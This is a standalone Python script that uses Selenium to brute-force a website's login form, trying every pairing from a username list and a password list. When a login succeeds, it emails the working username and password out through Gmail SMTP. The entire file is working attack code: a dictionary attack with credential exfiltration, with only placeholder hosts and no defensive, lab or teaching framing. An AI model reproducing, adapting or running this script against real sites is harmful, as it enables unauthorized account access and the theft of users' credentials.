import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

# Set up the web driver (assuming you're using Chrome)
driver = webdriver.Chrome('/home/kevin/Documents/Chromedriver/Chromedriver')

# Load the login page
driver.get('https://example.com/login')

# Retrieve the username and password from dictionary files
with open('/home/downloads/usernames.txt', 'r') as usernames_file:
    usernames = usernames_file.readlines()

with open('/home/downloads/passwords.txt', 'r') as passwords_file:
    passwords = passwords_file.readlines()

# Iterate through the usernames and passwords
for username in usernames:
    for password in passwords:
        # Enter the username and password in the login form
        username_field = driver.find_element_by_name('username')
        password_field = driver.find_element_by_name('password')

        username_field.clear()
        username_field.send_keys(username.strip())

        password_field.clear()
        password_field.send_keys(password.strip())

        # Submit the login form
        login_button = driver.find_element_by_id('login-button')
        login_button.click()

        # Check if the login is successful
        if driver.current_url == 'https://example.com/dashboard':
            # Send an email using Gmail SMTP
            sender_email = 'your-email@gmail.com'
            sender_password = 'your-password'

            recipient_email = 'recipient-email@example.com'
            subject = 'Login Successful'
            message = f'Username: {username.strip()}\nPassword: {password.strip()}'

            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = recipient_email
            msg['Subject'] = subject
            msg.attach(MIMEText(message, 'plain'))

            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(sender_email, sender_password)
                server.send_message(msg)

            # Close the web driver and exit the script
            driver.quit()
            exit()

# If no successful login occurred, close the web driver
driver.quit()
 
